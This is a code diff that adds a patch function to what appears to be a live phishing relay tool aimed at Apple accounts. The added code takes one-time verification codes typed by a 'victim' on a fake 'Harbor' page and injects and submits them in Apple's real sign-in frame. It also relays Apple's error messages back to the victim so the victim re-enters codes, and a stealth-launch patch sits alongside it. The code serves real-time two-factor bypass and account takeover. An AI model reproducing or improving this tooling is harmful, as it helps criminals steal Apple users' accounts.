@@ -354,6 +354,172 @@ def patch_remote_calm(text: str) -> str:
     return text
 
 
+def patch_harbor_otp_wipe(text: str) -> str:
+    if "def victim_wipe_harbor_otp(" in text:
+        return text
+    anchor = "def clear_victim_ui_busy(victim) -> None:"
+    insert = '''def apple_otp_error_message(apple_state: dict | None, frame) -> str:
+    if not apple_otp_step_ready(frame):
+        return ''
+    errors = (apple_state or {}).get('errors') or []
+    if not errors:
+        return ''
+    msg = pick_apple_error(errors) or clean_apple_error(errors[-1])
+    if not msg:
+        return ''
+    ml = msg.lower()
+    if 'verification code' in ml or 'incorrect verification' in ml:
+        return msg
+    if invalidate_for_message(msg) == 'otp':
+        return msg
+    return ''
+
+
+def victim_wipe_harbor_otp(victim, message: str, *, remote: bool) -> None:
+    msg = (message or '').strip() or 'Incorrect verification code.'
+    if remote and hasattr(victim, 'wipe_harbor_otp'):
+        victim.wipe_harbor_otp(msg)
+    elif remote and hasattr(victim, 'push_harbor_state'):
+        victim.push_harbor_state(
+            {
+                'verifyError': {'msg': msg},
+                'clearHarborOtp': True,
+                'mirrorLoading': False,
+            }
+        )
+    else:
+        victim_eval(
+            victim,
+            '(m) => window.HarborDriver && window.HarborDriver.showVerifyError(m)',
+            msg,
+            flush=True,
+        )
+
+
+'''
+    if anchor in text and "def victim_wipe_harbor_otp(" not in text:
+        text = text.replace(anchor, insert + anchor, 1)
+
+    if "harbor_otp_block_code = ''" not in text:
+        text = text.replace(
+            "        last_apple_otp_sync = ''\n        last_verify_copy_key = ''",
+            "        last_apple_otp_sync = ''\n        harbor_otp_block_code = ''\n        last_verify_copy_key = ''",
+            1,
+        )
+
+    old_err = """                    errors = (apple_state or {}).get('errors') or []
+                    if errors:
+                        msg = pick_apple_error(
+                            errors,
+                        ) or clean_apple_error(errors[-1])
+                        err_key = 'v:' + hashlib.sha256(msg.encode()).hexdigest()[:16]
+                        if err_key != last_error_key:
+                            add_log(f'apple otp error -> victim: {msg[:70]}')
+                            victim_eval(
+                                victim,
+                                "(m) => window.HarborDriver && window.HarborDriver.showVerifyError(m)",
+                                msg,
+                            )
+                            victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.stopVerifying()")
+                            victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.clearOtp()")
+                            victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")
+                            last_otp = ''
+                            last_apple_otp_sync = ''
+                            last_error_key = err_key
+                    elif last_error_key.startswith('v:'):
+                        victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.clearVerifyError()")
+                        last_error_key = ''
+
+                victim_path = victim_path_effective()"""
+    if old_err in text:
+        text = text.replace(
+            old_err,
+            "\n                victim_path = victim_path_effective()",
+            1,
+        )
+
+    marker = "# 2) Keep Apple OTP in sync with victim /verify, submit when complete."
+    if marker in text and "victim_wipe_harbor_otp" not in text.split(marker)[1][:2500]:
+        old_otp = text.split(marker, 1)[1].split("if path_of(victim.url) == '/payment':", 1)[0]
+        new_otp = """
+                # 2) Harbor /verify OTP -> Apple (on wrong code: wipe Harbor only).
+                if victim_path_effective() == '/verify':
+                    drain_inject_otp(out_dir, victim)
+                    digits = victim_otp_digits(victim, args.remote, remote_otp_slots)
+                    otp_clean = otp_digits_clean(digits)
+                    frame = find_apple_frame(apple, frame)
+                    st_otp = probe_apple_frame(frame) if frame else None
+                    otp_err = apple_otp_error_message(st_otp, frame)
+                    if otp_err:
+                        failed = (
+                            otp_clean
+                            or last_apple_otp_sync
+                            or last_otp
+                            or harbor_otp_block_code
+                            or ''
+                        )
+                        err_key = 'v:' + hashlib.sha256(
+                            (otp_err + '|' + failed).encode()
+                        ).hexdigest()[:16]
+                        if err_key != last_error_key:
+                            add_log(f'apple otp error -> victim: {otp_err[:70]}')
+                            victim_wipe_harbor_otp(victim, otp_err, remote=args.remote)
+                            remote_otp_slots[:] = [''] * 6
+                            last_victim_otp_slots[:] = [''] * 6
+                            last_apple_otp_sync = ''
+                            if failed:
+                                harbor_otp_block_code = failed
+                                last_otp = failed
+                            mirror_loading_until = 0.0
+                            last_error_key = err_key
+                    elif harbor_otp_block_code and otp_clean and otp_clean != harbor_otp_block_code:
+                        harbor_otp_block_code = ''
+                        last_otp = ''
+                        if last_error_key.startswith('v:'):
+                            last_error_key = ''
+
+                    want_slots = otp_slots_normalized(remote_otp_slots)
+                    if (
+                        not otp_err
+                        and frame
+                        and any(want_slots)
+                        and not otp_slots_equal(want_slots, last_victim_otp_slots)
+                    ):
+                        sync_apple_otp_slots_to_apple(frame, remote_otp_slots)
+                        last_victim_otp_slots = want_slots[:]
+                    if (
+                        not otp_err
+                        and len(otp_clean) == 6
+                        and otp_clean.isdigit()
+                        and otp_clean != last_otp
+                        and otp_clean != harbor_otp_block_code
+                    ):
+                        add_log('victim -> otp: ' + otp_clean)
+                        harbor_otp_block_code = ''
+                        if frame and _apple_otp_read(frame) != otp_clean:
+                            sync_apple_otp_to_apple(frame, otp_clean)
+                            last_victim_otp_slots = otp_slots_normalized(remote_otp_slots)
+                            last_apple_otp_sync = otp_clean
+                        if frame and _apple_otp_read(frame) == otp_clean:
+                            time.sleep(0.1)
+                            _try_otp_submit(frame)
+                        last_otp = otp_clean
+                        mirror_loading_until = time.time() + 20.0
+                        if not args.remote:
+                            victim_eval(
+                                victim,
+                                "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)",
+                            )
+                        elif hasattr(victim, 'push_harbor_state'):
+                            victim.push_harbor_state({'mirrorLoading': True})
+                        frame = find_apple_frame(apple, frame)
+
+                """
+        text = text.replace(marker + old_otp, new_otp, 1)
+
+    return text
+
+
 def patch_stealth_launch(text: str) -> str:
     needle = "    launch_opts: dict = {'headless': bool(args.headless)}\n    if args.channel:\n        launch_opts['channel'] = args.channel\n"
     insert = (
@@ -388,6 +554,7 @@ def main() -> None:
     text = replace_function(text, "apple_password_step_ready", APPLE_PW_READY_NEW)
     text = patch_remote_calm(text)
     text = patch_password_submit(text)
+    text = patch_harbor_otp_wipe(text)
     text = patch_stealth_launch(text)
     if "from apple_drive import drive_email" not in text:
         raise SystemExit("forward_email patch failed")
